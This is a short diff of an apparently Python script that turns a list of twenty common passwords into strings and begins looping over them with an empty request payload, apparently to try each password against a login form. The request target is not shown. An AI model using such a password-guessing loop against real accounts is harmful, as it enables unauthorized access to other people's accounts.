@@ -2,7 +2,7 @@ import requests
 import time
 
 
-pass1 = [123456, 123456789, "picture1", "password", 12345678, 111111, 123123, 12345, 1234567890, "senha", 1234567, "qwerty", "abc123", "Million2", 000000, 1234, "iloveyou", "aaron431", "password1", "qqww1122"]
+pass1 = ["123456", "123456789", "picture1", "password", "12345678", "111111", "123123", "12345", "1234567890", "senha", "1234567", "qwerty", "abc123", "Million2", "000000", "1234", "iloveyou", "aaron431", "password1", "qqww1122"]
 payload1 = {}
 
 for i in pass1:
